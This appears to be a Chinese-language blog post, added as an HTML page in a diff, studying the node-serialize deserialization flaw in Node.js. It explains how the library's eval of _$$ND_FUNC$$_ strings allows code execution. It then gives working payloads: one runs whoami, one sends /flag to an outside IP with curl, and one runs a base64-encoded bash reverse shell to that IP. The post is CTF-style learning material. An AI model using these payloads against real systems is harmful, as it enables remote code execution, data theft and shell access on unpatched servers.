@@ -1,0 +1,209 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>node反序列化学习 - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="学习文章：
+1https:&amp;#x2F;&amp;#x2F;zhuanlan.zhihu.com&amp;#x2F;p&amp;#x2F;25581847
+
+说是node有反序列化，其实是一个库的反序列化有漏洞 node-s,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">node反序列化学习</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">node反序列化学习</h1>
+        <div class="stuff">
+            <span>六月 22, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/node/" rel="tag">node</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>学习文章：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;25581847</span><br></pre></td></tr></table></figure>
+
+<p>说是node有反序列化，其实是一个库的反序列化有漏洞 node-serialize</p>
+<p>通过审计源码我们可以发现：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span>(<span class="params">key <span class="keyword">in</span> obj</span>)</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">obj.hasOwnProperty(key)</span>)</span> &#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params"><span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;object&#x27;</span></span>)</span> &#123;</span><br><span class="line">      obj[key] = <span class="built_in">exports</span>.unserialize(obj[key], originObj);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params"><span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;string&#x27;</span></span>)</span> &#123;</span><br><span class="line">      <span class="function"><span class="title">if</span>(<span class="params">obj[key].indexOf(FUNCFLAG) === <span class="number">0</span></span>)</span> &#123;</span><br><span class="line">        obj[key] = <span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span> + obj[key].substring(FUNCFLAG.length) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params">obj[key].indexOf(CIRCULARFLAG) === <span class="number">0</span></span>)</span> &#123;</span><br><span class="line">        obj[key] = obj[key].substring(CIRCULARFLAG.length);</span><br><span class="line">        circularTasks.push(&#123;<span class="attr">obj</span>: obj, <span class="attr">key</span>: key&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>当indexOf(FUNCFLAG) ====0的时候就会执行我们的代码了。并且执行的时候会截取去除掉FUNCFLAG的部分，其实这样就是任意代码执行了，捏个子进程出来</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;go&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;whoami &gt;&gt;1&#x27;)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210623113823031.png" alt="image-20210623113823031"></p>
+<p><img src="image-20210623113843785.png" alt="image-20210623113843785"></p>
+<p>但是实际环境下我们可能没有写入的权限，所以尝试把他反弹出来.. </p>
+<p>ctf中可以直接这样子：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;go&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;curl http://81.69.201.65:1234/$(cat /flag|base64)&#x27;)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell的话可以这样：</p>
+<p>直接执行bash的话我试了老半天发现没发成功也不知道为啥，于是base64一下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;go&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo IGJhc2ggLWkgPiYgL2Rldi90Y3AvODEuNjkuMjAxLjY1LzEyMzQgMD4mMQ==|base64 -d|bash&#x27;)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功getshell</p>
+<p><img src="image-20210623115037352.png" alt="image-20210623115037352"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+				
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
